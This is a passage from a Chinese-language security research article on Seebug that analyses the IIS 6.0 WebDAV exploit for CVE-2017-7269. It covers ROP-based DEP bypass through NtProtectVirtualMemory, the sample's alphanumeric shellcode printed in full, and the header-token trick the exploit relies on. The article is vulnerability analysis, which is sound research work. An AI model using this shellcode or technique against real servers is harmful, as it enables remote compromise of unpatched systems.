<span class="mi">68016086</span> <span class="mi">8</span><span class="n">b4004</span>          <span class="n">mov</span>     <span class="n">eax</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">4</span><span class="o">]</span>
<span class="mi">68016089</span> <span class="mi">50</span>              <span class="n">push</span>    <span class="n">eax</span>
<span class="mi">6801608</span><span class="n">a</span> <span class="n">c3</span>              <span class="n">ret</span>
<span class="mi">6801608</span><span class="n">b</span> <span class="n">cc</span>              <span class="n">int</span>     <span class="mi">3</span>
<span class="mi">6801608</span><span class="n">c</span> <span class="n">cc</span>              <span class="n">int</span>     <span class="mi">3</span>
<span class="mi">6801608</span><span class="n">d</span> <span class="n">cc</span>              <span class="n">int</span>     <span class="mi">3</span>
</pre></div>


<h3>3.5 绕过 DEP</h3>
<p>在执行 ROP 代码片段时，会跳转到 <code>KiFastSystemCall</code> 去执行，这里将 <strong>EAX</strong> 寄存器的值设置为 <code>0x8F</code>，也就是 <code>NtProtectVirtualMemory</code> 的服务号，函数的参数通过栈进行传递。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">dds</span> <span class="n">esp</span>
<span class="mi">68031400</span>  <span class="mi">68031460</span>      <span class="o">--&gt;</span> <span class="k">return</span> <span class="n">address</span>
<span class="mi">68031404</span>  <span class="mi">7</span><span class="n">ffe0300</span>      <span class="o">--&gt;</span> <span class="n">SharedUserData</span><span class="o">!</span><span class="n">SystemCallStub</span>
<span class="mi">68031408</span>  <span class="n">ffffffff</span>      <span class="o">--&gt;</span> <span class="n">ProcessHandle</span><span class="o">,</span> <span class="n">CURRENT_PROCESS</span>
<span class="mi">6803140</span><span class="n">c</span>  <span class="mi">680313</span><span class="n">c0</span>      <span class="o">--&gt;</span> <span class="n">BaseAddress</span>
<span class="mi">68031410</span>  <span class="mi">6803046</span><span class="n">e</span>      <span class="o">--&gt;</span> <span class="n">RegionSize</span><span class="o">,</span> <span class="mh">0x48</span>
<span class="mi">68031414</span>  <span class="mi">00000040</span>      <span class="o">--&gt;</span> <span class="n">NewProtectWin32</span><span class="o">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span>
<span class="mi">68031418</span>  <span class="mi">68031434</span>      <span class="o">--&gt;</span> <span class="n">OldProtect</span>
</pre></div>


<p>TK 在 CanSecWest 2013 的演讲《<strong>DEP/ASLR bypass without ROP/JIT</strong>》[<a href="https://cansecwest.com/slides/2013/DEP-ASLR%20bypass%20without%20ROP-JIT.pdf">4</a>] 中提到：</p>
<blockquote>
<p>SharedUserData is always fixed in 0x7ffe0000 from Windows NT 4 to Windows 8
0x7ffe0300 is always point to KiFastSystemCall
Only work on x86 Windows</p>
</blockquote>
<p>这里就是用了 <code>0x7ffe0300</code> 这个地址来定位 <code>KiFastSystemCall</code>（关于 <code>KiFastSystemCall</code> 的介绍，可以参考文档 《<strong>KiFastCallEntry() 机制分析</strong>》 [<a href="http://www.mouseos.com/windows/kernel/KiFastCallEntry.html">5</a>]）。</p>
<h3>3.6 Shellcode</h3>
<p>样本中的 Shellcode 如下：</p>
<div class="codehilite"><pre><span></span>VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAI
AXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8
Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LM
X1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6
P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XK
Q3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJ
Z2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3UL
Y7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA
</pre></div>


<p>前面分析到函数 <code>CRequest::LpwszGetHeader</code> 会把其转成 UNICODE 字符串，所以在内存中长这个样子：</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mi">68031460</span>
<span class="mi">68031460</span>  <span class="mi">55</span> <span class="mi">00</span> <span class="mi">56</span> <span class="mi">00</span> <span class="mi">59</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span><span class="o">-</span><span class="mi">34</span> <span class="mi">00</span> <span class="mi">34</span> <span class="mi">00</span> <span class="mi">34</span> <span class="mi">00</span> <span class="mi">34</span> <span class="mi">00</span>  <span class="n">U</span><span class="o">.</span><span class="na">V</span><span class="o">.</span><span class="na">Y</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="mf">4.4</span><span class="o">.</span><span class="mf">4.4</span><span class="o">.</span>
<span class="mi">68031470</span>  <span class="mi">34</span> <span class="mi">00</span> <span class="mi">34</span> <span class="mi">00</span> <span class="mi">34</span> <span class="mi">00</span> <span class="mi">34</span> <span class="mi">00</span><span class="o">-</span><span class="mi">34</span> <span class="mi">00</span> <span class="mi">34</span> <span class="mi">00</span> <span class="mi">51</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span>  <span class="mf">4.4</span><span class="o">.</span><span class="mf">4.4</span><span class="o">.</span><span class="mf">4.4</span><span class="o">.</span><span class="na">Q</span><span class="o">.</span><span class="na">A</span><span class="o">.</span>
<span class="mi">68031480</span>  <span class="mi">54</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span> <span class="mi">58</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span><span class="o">-</span><span class="mi">5</span><span class="n">a</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span> <span class="mi">50</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span>  <span class="n">T</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">X</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">Z</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">P</span><span class="o">.</span><span class="na">A</span><span class="o">.</span>
<span class="mi">68031490</span>  <span class="mi">33</span> <span class="mi">00</span> <span class="mi">51</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span> <span class="mi">44</span> <span class="mi">00</span><span class="o">-</span><span class="mi">41</span> <span class="mi">00</span> <span class="mi">5</span><span class="n">a</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span> <span class="mi">42</span> <span class="mi">00</span>  <span class="mi">3</span><span class="o">.</span><span class="na">Q</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">D</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">Z</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">B</span><span class="o">.</span>
<span class="mi">680314</span><span class="n">a0</span>  <span class="mi">41</span> <span class="mi">00</span> <span class="mi">52</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span> <span class="mi">4</span><span class="n">c</span> <span class="mi">00</span><span class="o">-</span><span class="mi">41</span> <span class="mi">00</span> <span class="mi">59</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span> <span class="mi">49</span> <span class="mi">00</span>  <span class="n">A</span><span class="o">.</span><span class="na">R</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">L</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">Y</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">I</span><span class="o">.</span>
<span class="mi">680314</span><span class="n">b0</span>  <span class="mi">41</span> <span class="mi">00</span> <span class="mi">51</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span> <span class="mi">49</span> <span class="mi">00</span><span class="o">-</span><span class="mi">41</span> <span class="mi">00</span> <span class="mi">51</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span> <span class="mi">50</span> <span class="mi">00</span>  <span class="n">A</span><span class="o">.</span><span class="na">Q</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">I</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">Q</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">P</span><span class="o">.</span>
<span class="mi">680314</span><span class="n">c0</span>  <span class="mi">41</span> <span class="mi">00</span> <span class="mi">35</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span><span class="o">-</span><span class="mi">41</span> <span class="mi">00</span> <span class="mi">50</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span> <span class="mi">5</span><span class="n">a</span> <span class="mi">00</span>  <span class="n">A</span><span class="o">.</span><span class="mi">5</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">P</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">Z</span><span class="o">.</span>
<span class="mi">680314</span><span class="n">d0</span>  <span class="mi">31</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span> <span class="mi">49</span> <span class="mi">00</span> <span class="mi">31</span> <span class="mi">00</span><span class="o">-</span><span class="mi">41</span> <span class="mi">00</span> <span class="mi">49</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span> <span class="mi">49</span> <span class="mi">00</span>  <span class="mi">1</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">I</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">I</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="na">I</span><span class="o">.</span>
</pre></div>


<p>这是所谓的 <strong>Alphanumeric Shellcode</strong> [<a href="https://github.com/SkyLined/alpha3">6</a>]，可以以 ASCII 或者 UNICODE 字符串形式呈现 Shellcode。</p>
<h3>3.7 The Last Question</h3>
<p>最后一个问题是，在 Exploit 的两个 URL 之间存在 <code>(Not &lt;locktoken:write1&gt;)</code> 这样一个字符串，这个字符串的作用是什么呢？如果删掉这个字符串，Exploit 就失效了，因为 <code>HrCheckIfHeader</code> 中解析 URL 的流程中断了，而解析流程得以继续的关键是 <code>while</code> 循环中嵌套的 <code>for</code> 循环对 <code>IFITER::PszNextToken(2)</code> 的调用。需要注意的是，这里传递的参数值是 <code>2</code>，而分析 <code>IFITER::PszNextToken()</code> 的反汇编代码，可以知道这个字符串只要满足一定的形式就可以了，如 <code>(nOt &lt;hahahahah+asdfgh&gt;)</code> 或者 <code>(nOt [hahahahah+asdfgh])</code> 都是可以的。</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="n">__thiscall</span> <span class="n">IFITER</span><span class="o">::</span><span class="n">PszNextToken</span><span class="p">(</span><span class="kt">int</span> <span class="n">this</span><span class="p">,</span> <span class="kt">signed</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">//......</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">_wcsnicmp</span><span class="p">(</span><span class="sa">L</span><span class="s">&quot;not&quot;</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span><span class="p">,</span> <span class="mi">3u</span><span class="p">)</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+=</span> <span class="mi">6</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">28</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>       <span class="c1">// ----&gt; 设置值</span>
    <span class="k">while</span> <span class="p">(</span> <span class="o">**</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">iswspace</span><span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="p">)</span>
      <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!**</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="p">)</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">v17</span> <span class="o">=</span> <span class="o">**</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v17</span> <span class="o">==</span> <span class="sc">&#39;&lt;&#39;</span> <span class="p">)</span>
  <span class="p">{</span>
<span class="nl">LABEL_64</span><span class="p">:</span>
    <span class="n">v23</span> <span class="o">=</span> <span class="sc">&#39;&gt;&#39;</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">LABEL_65</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v17</span> <span class="o">!=</span> <span class="sc">&#39;[&#39;</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v23</span> <span class="o">=</span> <span class="sc">&#39;]&#39;</span><span class="p">;</span>
<span class="nl">LABEL_65</span><span class="p">:</span>
  <span class="n">v20</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
  <span class="n">v21</span> <span class="o">=</span> <span class="n">wcschr</span><span class="p">((</span><span class="k">const</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">v20</span> <span class="o">+</span> <span class="mi">2</span><span class="p">),</span> <span class="n">v23</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="n">v21</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v21</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="n">v21</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">v22</span> <span class="o">=</span> <span class="n">v2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
  <span class="n">StringBuffer</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;::</span><span class="n">AppendAt</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> 
    <span class="mi">2</span> <span class="o">*</span> <span class="p">((</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v21</span> <span class="o">-</span> <span class="n">v20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">v20</span><span class="p">);</span>
  <span class="n">StringBuffer</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;::</span><span class="n">AppendAt</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> 
    <span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc_wszEmpty</span><span class="p">);</span>
  <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v22</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>不过 <code>not</code> 字符串是不能替换的，因为这里会影响程序的执行流程。从上面的代码可以看出，存在 <code>not</code> 字符串时会将对象偏移 <code>28 (0x1C)</code> 处的值设置为 <code>1</code>，这个值会决定父级函数中的一个跳转（<code>goto LABEL_27</code>）是否执行。</p>
<div class="codehilite"><pre><span></span>// v22      -&gt; ebp-44C
// ifilter  -&gt; ebp-468
// 0x468 + 0x1C = 0x44C

if ( !FGetLastModTime(0, v8, &amp;v23) || !FETagFromFiletime(
        &amp;v23, &amp;String, *((const struct IEcb **)a1 + 4)) )
{
LABEL_26:
  if ( v22 )                            // ==1
    goto LABEL_27;
  goto LABEL_30;
}
</pre></div>


<h2>4. 其他</h2>
<p>要编写一个真实环境中通用的 Exploit，还需要考虑许多其他因素，比如 IIS 设置的物理路径等，文章 [<a href="https://xianzhi.aliyun.com/forum/read/1458.html">7</a>] 列举了一些注意事项。</p>
<p>此外，文章 [<a href="https://ht-sec.org/cve-2017-7269-hui-xian-poc-jie-xi/">8</a>] 提到了一种基于 HTTP 回传信息的方法。</p>
<p>当然，关于编写通用 Exploit 所需要注意的细节，也可以参考 NSA 的 Explodingcan 的参数设置。</p>
<p><img alt="NSA Explodingcan 参数设置" src="https://images.seebug.org/content/images/2017/04/4BB246A3-76D5-431E-A798-6E629C729C02.png-w331s" /></p>
<h1>5. References</h1>
<p><strong>[1]</strong> https://github.com/edwardz246003/IIS_exploit<br />
<strong>[2]</strong> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269<br />
<strong>[3]</strong> https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html<br />
<strong>[4]</strong> https://cansecwest.com/slides/2013/DEP-ASLR%20bypass%20without%20ROP-JIT.pdf<br />
<strong>[5]</strong> http://www.mouseos.com/windows/kernel/KiFastCallEntry.html<br />
<strong>[6]</strong> https://github.com/SkyLined/alpha3 <br />
<strong>[7]</strong> https://xianzhi.aliyun.com/forum/read/1458.html<br />
<strong>[8]</strong> https://ht-sec.org/cve-2017-7269-hui-xian-poc-jie-xi/</p>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/282/">https://paper.seebug.org/282/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/280/"><span aria-hidden="true">&larr;</span> NSA Eternalblue SMB 漏洞分析</a>
    
    
      <a class="older-posts" href="/281/">Edge – 阅读模式下的 SOP 绕过 <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
        <footer class="post-footer">
          <figure class="author-image">
            <a class="img" href="/users/author/?nickname=Ke+Liu"
               style="background-image: url(https://images.seebug.org/uploads/2017/08/avatar.png)"><span
                class="hidden">'s Picture</span></a>
          </figure>

          <section class="author">
            <h4><a
                href="/users/author/?nickname=Ke+Liu">Ke Liu</a>
            </h4>
            <p>阅读更多有关<a
                href="/users/author/?nickname=Ke+Liu">该作者</a>的文章
            </p>
            
            <div class="author-meta">
            </div>
          </section>

          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          

        </footer>
      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
